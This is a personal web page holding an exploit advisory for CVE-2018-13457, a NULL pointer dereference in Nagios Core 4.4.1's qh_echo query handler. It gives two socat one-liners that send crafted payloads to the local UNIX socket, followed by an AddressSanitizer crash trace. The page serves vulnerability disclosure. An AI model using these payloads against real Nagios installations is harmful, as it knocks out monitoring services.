<!DOCTYPE html>
<html lang="en">
<head>
    <title>Fakhri Zulkifli</title>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="blog, accent, , Fakhri Zulkifli, jekyll">
    <meta name="author" content="">
    
    
    
    <meta name="description" content="personal website">
    <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
    <link rel="alternate" type="application/rss+xml" title="Fakhri Zulkifli RSS" href="/feed.xml" />
    <link rel="stylesheet" href="http://localhost:4000/css/main.css">
    
    
    <!-- Facebook Open Graph -->
    <meta name="og:description" content="personal website">
    <meta name="og:title" content="Fakhri Zulkifli">
    <meta name="og:url" content="http://localhost:4000/CVE-2018-13457.html">
    <meta name="og:type" content="article">
    
    
    <!-- Twitter -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Fakhri Zulkifli">
    <meta name="twitter:description" content="personal website">
    <meta name="twitter:url" content="http://localhost:4000/CVE-2018-13457.html">
    
        <meta name="twitter:image" content="">
    
</head>
<body>
    <div class="wrapper">
        <div class="navbar container">
            <a id="author-name" class="alignable pull-left" href="http://localhost:4000">Fakhri Zulkifli</a>
            <ul class="alignable pull-right navbar-ul">
                
                    
                        <li class="alignable pull-right nav-list"><a target="_blank" href="resume.pdf">Resume</a>
                    
                    
                        </li>
                
                    
                        <li class="alignable pull-right nav-list"><a href="/">About</a>
                    
                    
                        /
                    
                        </li>
                
            </ul>
        </div>
        <div style="clear:both"></div>
        <hr>
        
            <div class="container content">
        
                <p>Exploit Title: Nagios Core qh_echo Denial of Service<br />
Date: 2018-07-09<br />
Exploit Author: Fakhri Zulkifli (@d0lph1n98)<br />
Vendor Homepage: https://www.nagios.org/<br />
Software Link: https://www.nagios.org/downloads/nagios-core/<br />
Version: 4.4.1 and earlier<br />
Tested on: 4.4.1<br />
CVE : CVE-2018-13457<br />
<br />
qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.<br />
<br />
$ echo -ne “#echo\0” | socat unix-connect:./poc/nagios.qh -<br />
$ echo -ne “@echo\0” | socat unix-connect:./poc/nagios.qh -<br />
<br />
#0 0x4cb18b in __interceptor_strcmp.part.60 /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:422<br />
#1 0x554e98 in qh_echo /home/user/nagioscore/base/query-handler.c:29:7<br />
#2 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12<br />
#3 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4<br />
#4 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12<br />
#5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4<br />
#6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br />
#7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)<br /></p>

				
            </div>
    </div>
    
</body>
<footer>
</footer>
